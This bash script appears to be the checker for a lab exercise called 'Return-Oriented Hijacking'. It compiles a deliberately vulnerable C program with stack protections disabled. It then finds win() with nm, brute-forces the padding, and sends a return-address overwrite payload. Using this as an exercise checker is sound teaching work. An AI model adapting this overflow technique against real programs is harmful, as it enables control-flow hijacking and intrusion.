#!/usr/bin/env bash
# verify.sh — Ex01: Return-Oriented Hijacking
# Compiles, resolves win()'s address, brute-forces the padding, fires the exploit.

set -euo pipefail
DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
cd "$DIR"

# 1. Compile
gcc -fno-stack-protector -no-pie -o horizon_01 horizon_01.c 2>/dev/null || {
    echo "[ERROR] Compilation failed."
    exit 1
}

# 2. Exploit via Python (stdin handles null bytes cleanly)
python3 - <<'PYEOF'
import subprocess, struct, sys

nm = subprocess.run(["nm", "./horizon_01"], capture_output=True, text=True)
win_addr = None
for line in nm.stdout.splitlines():
    parts = line.split()
    if len(parts) >= 3 and "win" in parts[2] and parts[1] == "T":
        win_addr = int(parts[0], 16)
        break

if win_addr is None:
    print("[ERROR] Symbol 'win' not found via nm.")
    sys.exit(1)

# Brute-force common padding offsets — no debugger needed
for offset in [16, 24, 32, 40, 48, 56]:
    payload = b"A" * offset + struct.pack("<Q", win_addr)
    try:
        proc = subprocess.run(
            ["./horizon_01"],
            input=payload,
            capture_output=True,
            timeout=2,
        )
        combined = proc.stdout + proc.stderr
        if b"[SUCCESS]" in combined:
            print(combined.decode("utf-8", errors="replace"))
            sys.exit(0)
    except subprocess.TimeoutExpired:
        continue
    except Exception:
        continue

sys.exit(1)
PYEOF
